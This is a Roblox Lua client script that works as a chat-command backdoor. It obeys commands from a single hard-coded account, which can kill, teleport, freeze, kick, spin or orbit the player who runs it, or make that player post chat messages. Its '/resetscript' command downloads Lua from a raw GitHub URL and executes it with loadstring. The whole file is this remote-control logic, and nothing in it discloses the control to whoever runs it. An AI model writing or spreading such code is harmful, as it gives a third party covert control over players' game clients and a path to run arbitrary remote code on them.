local ReplicatedStorage = game:FindService("ReplicatedStorage")
local ChatEvents = ReplicatedStorage:WaitForChild("DefaultChatSystemChatEvents")
local OnMessageEvent = ChatEvents:WaitForChild("OnMessageDoneFiltering")
local SayMessageRequest = ChatEvents:WaitForChild("SayMessageRequest")

if not SayMessageRequest:IsA("RemoteEvent") or not OnMessageEvent:IsA("RemoteEvent") then return end

local lp = game:FindService("Players").LocalPlayer
local hrp = lp.Character:FindFirstChild("HumanoidRootPart")
local lpName = game:FindService("Players").LocalPlayer.Name

local orbiting = false
local orbitConnection

OnMessageEvent.OnClientEvent:Connect(function(data)
    pcall(function()
        if not data then return end
        local player = tostring(data.FromSpeaker)
        if player == lpName then return end
        local message = tostring(data.Message)

        if message == "/kill" and player == "Dkailhan_1" then
            lp.Character.Humanoid.Health = 0
        elseif message == "/bring" and player == "Dkailhan_1" then
            local owner = game:GetService("Players"):FindFirstChild("Dkailhan_1")
            lp.Character.HumanoidRootPart.CFrame = owner.Character.HumanoidRootPart.CFrame
        elseif message == "/fr" and player == "Dkailhan_1" then
            lp.Character.HumanoidRootPart.Anchored = true
        elseif message == "/unfr" and player == "Dkailhan_1" then
            lp.Character.HumanoidRootPart.Anchored = false
        elseif string.sub(message, 1, 4) == "/say" and player == "Dkailhan_1" then
            local toSay = string.sub(message, 6)
            SayMessageRequest:FireServer(toSay, "All")
        elseif string.sub(message, 1, 5) == "/kick" and player == "Dkailhan_1" then
            local kickms = string.sub(message, 7)
            lp:Kick(kickms)
        elseif string.sub(message, 1, 5) == "/spin" and player == "Dkailhan_1" then
            local numbertospin = tonumber(string.sub(message, 7)) or 100
            for i = 1, numbertospin do
                hrp.CFrame = hrp.CFrame * CFrame.Angles(0, math.rad(36), 0)
                task.wait()
            end
        elseif message == "/resetscript" and player == "Dkailhan_1" then
            loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/piggy.lua"))()
        elseif string.sub(message, 1, 6) == "/orbit" and player == "Dkailhan_1" then
            local owner = game:GetService("Players"):FindFirstChild("Dkailhan_1")
            local radius = tonumber(string.sub(message, 8)) or 10
            if not orbiting then
                orbiting = true
                orbitConnection = game:GetService("RunService").RenderStepped:Connect(function()
                    local angle = tick() * math.rad(90)
                    hrp.CFrame = owner.Character.HumanoidRootPart.CFrame * CFrame.new(math.cos(angle) * radius, 0, math.sin(angle) * radius)
                end)
            end
        elseif message == "/unorbit" and player == "Dkailhan_1" then
            if orbiting then
                orbiting = false
                if orbitConnection then
                    orbitConnection:Disconnect()
                    orbitConnection = nil
                end
            end
        end
    end)
end)
